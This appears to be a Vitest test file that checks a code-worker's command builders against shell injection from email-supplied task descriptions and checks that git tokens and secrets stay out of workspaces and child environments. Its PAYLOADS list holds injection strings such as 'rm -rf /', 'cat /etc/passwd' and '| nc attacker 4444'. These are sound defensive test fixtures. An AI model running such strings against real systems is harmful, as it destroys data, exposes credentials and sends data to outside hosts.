import { describe, it, expect } from 'vitest';
import {
	buildCloneArgs,
	buildPullArgs,
	buildCheckoutArgs,
	buildDiffStatArgs,
	buildAddArgs,
	buildCommitArgs,
	buildPushArgs,
	buildBranchName,
	buildOpencodeArgs,
	buildAgentEnv,
	buildTestEnv,
	buildVitestArgs,
	buildCommitMessage,
	parseRepoUrl,
} from '../taskRunner.js';

/**
 * Strings an attacker could embed in an inbound-email task description to attempt
 * shell breakout. Because every command is run with an argv array and
 * `shell: false`, each of these must appear as exactly ONE argv element and never
 * be split, concatenated, or otherwise interpreted.
 */
const PAYLOADS = [
	'"; touch /tmp/pwned; #',
	'$(id)',
	'`id`',
	'foo && rm -rf / ; echo done',
	"'; cat /etc/passwd; '",
	'| nc attacker 4444',
	'normal description with spaces',
];

const SHELL_METACHARS = ['$(', '`', '&&', '||', ';', '|', '>', '<', '\n'];

describe('code-worker command construction (shell-injection hardening)', () => {
	describe('buildCommitMessage + buildCommitArgs', () => {
		it.each(PAYLOADS)('keeps the description as one discrete -m argv element: %s', (payload) => {
			const message = buildCommitMessage(payload);
			const argv = buildCommitArgs('/workspace/task-1', message);

			// `git -C <dir> commit -m <message>` — the message is the final element.
			expect(argv[0]).toBe('-C');
			expect(argv[1]).toBe('/workspace/task-1');
			expect(argv[2]).toBe('commit');
			expect(argv[3]).toBe('-m');
			expect(argv).toHaveLength(5);

			// The full untrusted payload (truncated) lives in exactly one element.
			const messageArg = argv[4];
			expect(messageArg).toBe(message);
			expect(messageArg).toContain(payload.slice(0, 72));

			// No other argv element leaked any piece of the untrusted text.
			for (let i = 0; i < argv.length - 1; i++) {
				expect(argv[i]).not.toContain(payload);
			}
		});

		it('truncates the subject to 72 chars but never escapes via a shell', () => {
			const payload = `$(${'A'.repeat(200)})`;
			const message = buildCommitMessage(payload);
			const argv = buildCommitArgs('/workspace/task-1', message);
			// The whole message is still a single argv element regardless of length.
			expect(argv[4]).toBe(message);
			expect(argv).toHaveLength(5);
		});
	});

	describe('buildOpencodeArgs', () => {
		it.each(PAYLOADS)('passes the description as one --message argv element: %s', (payload) => {
			const argv = buildOpencodeArgs(payload);
			expect(argv[0]).toBe('--non-interactive');
			expect(argv[1]).toBe('--message');
			expect(argv[2]).toBe(payload);
			expect(argv).toHaveLength(3);
			// Crucially: no escaping/quoting was applied — the raw payload is the arg,
			// which is safe precisely because it is never handed to a shell.
			expect(argv[2]).not.toContain('\\"');
		});
	});

	describe('buildBranchName', () => {
		it('derives the branch solely from the task id', () => {
			expect(buildBranchName('abc123')).toBe('code-worker/abc123');
		});

		it.each(PAYLOADS)('contains the id verbatim with no shell expansion: %s', (payload) => {
			// Even if a hostile id reached here, the checkout argv keeps it discrete.
			const branch = buildBranchName(payload);
			const argv = buildCheckoutArgs('/workspace/task-1', branch);
			expect(argv).toEqual(['-C', '/workspace/task-1', 'checkout', '-b', branch]);
			expect(argv[4]).toBe(branch);
		});
	});

	describe('git plumbing builders never embed metacharacters as shell tokens', () => {
		it('buildCloneArgs is a fixed-shape argv with discrete url/branch/dir', () => {
			const argv = buildCloneArgs('https://x/y.git', 'main', '/workspace/task-1');
			expect(argv).toEqual([
				'clone',
				'--depth',
				'1',
				'--branch',
				'main',
				'https://x/y.git',
				'/workspace/task-1',
			]);
		});

		it('buildPullArgs / buildDiffStatArgs / buildAddArgs / buildPushArgs are fixed argv shapes', () => {
			expect(buildPullArgs('/w', 'main')).toEqual(['-C', '/w', 'pull', 'origin', 'main']);
			expect(buildDiffStatArgs('/w')).toEqual(['-C', '/w', 'diff', '--stat']);
			expect(buildAddArgs('/w')).toEqual(['-C', '/w', 'add', '-A']);
			expect(buildPushArgs('/w', 'feat')).toEqual(['-C', '/w', 'push', 'origin', 'feat']);
		});

		it('buildVitestArgs is a fixed argv with no shell redirection or `|| true`', () => {
			const argv = buildVitestArgs();
			expect(argv).toEqual(['vitest', 'run', '--reporter=verbose']);
			// The old `2>&1 || true` shell-string smell must be gone.
			for (const el of argv) {
				expect(el).not.toContain('||');
				expect(el).not.toContain('2>&1');
			}
		});
	});

	describe('no builder concatenates an untrusted payload into a single shell-like token', () => {
		it.each(PAYLOADS)('every emitted argv element is a clean discrete token: %s', (payload) => {
			const branch = buildBranchName('task-1');
			const message = buildCommitMessage(payload);
			const argvSets = [
				buildCloneArgs(payload, payload, payload),
				buildPullArgs(payload, payload),
				buildCheckoutArgs(payload, branch),
				buildDiffStatArgs(payload),
				buildAddArgs(payload),
				buildCommitArgs(payload, message),
				buildPushArgs(payload, branch),
				buildOpencodeArgs(payload),
			];

			for (const argv of argvSets) {
				// The payload, where present, occupies whole argv elements — it is
				// never fused with a flag/subcommand into one `sh -c`-style token.
				for (const el of argv) {
					if (el.includes(payload) || (message.includes(payload) && el === message)) {
						// Allowed: the element IS the payload (or the message wrapping it).
						continue;
					}
					// Otherwise the element is a static command token that must not have
					// absorbed any shell metacharacter from the payload.
					for (const meta of SHELL_METACHARS) {
						if (payload.includes(meta)) {
							expect(el).not.toContain(meta);
						}
					}
				}
			}
		});
	});
});

describe('git credentials never persist into the untrusted workspace', () => {
	const TOKEN_URL = 'https://x-access-token:ghp_secret@github.com/o/r.git';

	it('parseRepoUrl strips the credential from the URL and carries it out-of-band', () => {
		const { cleanUrl, authArgs } = parseRepoUrl(TOKEN_URL);
		// The clone URL — which is what lands in workDir/.git/config — has no token.
		expect(cleanUrl).toBe('https://github.com/o/r.git');
		expect(cleanUrl).not.toContain('ghp_secret');
		expect(cleanUrl).not.toContain('x-access-token');
		// The credential travels via an http.extraheader arg, not the URL or config.
		expect(authArgs[0]).toBe('-c');
		expect(authArgs[1]).toMatch(/^http\.extraheader=Authorization: Basic /);
		const basic = authArgs[1]!.replace('http.extraheader=Authorization: Basic ', '');
		expect(Buffer.from(basic, 'base64').toString('utf-8')).toBe('x-access-token:ghp_secret');
	});

	it('the clone argv persists a tokenless origin (nothing for the agent to read off disk)', () => {
		const { cleanUrl, authArgs } = parseRepoUrl(TOKEN_URL);
		const argv = buildCloneArgs(cleanUrl, 'main', '/workspace/task-1', authArgs);
		// The positional repo URL (written to .git/config) carries no secret…
		expect(argv).toContain('https://github.com/o/r.git');
		expect(argv).not.toContain(TOKEN_URL);
		// …and the auth header is a leading `-c` global option, not part of the URL.
		expect(argv[0]).toBe('-c');
		const urlElement = argv.find((a) => a.startsWith('https://'));
		expect(urlElement).not.toContain('ghp_secret');
	});

	it('a tokenless repo URL passes through unchanged with no auth args', () => {
		expect(parseRepoUrl('https://github.com/o/r.git')).toEqual({
			cleanUrl: 'https://github.com/o/r.git',
			authArgs: [],
		});
	});
});

describe('child process environments', () => {
	const parentEnv = {
		PATH: '/usr/bin',
		HOME: '/root',
		GITHUB_TOKEN: 'ghp_secret',
		CONVEX_URL: 'http://convex:3210',
		CONVEX_INTERNAL_KEY: 'internal-secret',
		LLM_BASE_URL: 'https://llm.example.com',
		LLM_API_KEY: 'llm-secret',
		GIT_REPO_URL: 'https://x-access-token:ghp_secret@github.com/o/r.git',
	};

	it('agent env carries only PATH, workspace HOME, and LLM credentials', () => {
		const env = buildAgentEnv('/workspace/task1', parentEnv);
		expect(env).toEqual({
			PATH: '/usr/bin',
			HOME: '/workspace/task1',
			LLM_BASE_URL: 'https://llm.example.com',
			LLM_API_KEY: 'llm-secret',
		});
	});

	it('test env carries no credentials at all', () => {
		const env = buildTestEnv('/workspace/task1', parentEnv);
		expect(env).toEqual({ PATH: '/usr/bin', HOME: '/workspace/task1', CI: 'true' });
	});

	it.each(['GITHUB_TOKEN', 'CONVEX_INTERNAL_KEY', 'CONVEX_URL', 'GIT_REPO_URL'])(
		'%s never reaches a child that executes task code',
		(key) => {
			expect(buildAgentEnv('/w', parentEnv)).not.toHaveProperty(key);
			expect(buildTestEnv('/w', parentEnv)).not.toHaveProperty(key);
		},
	);
});
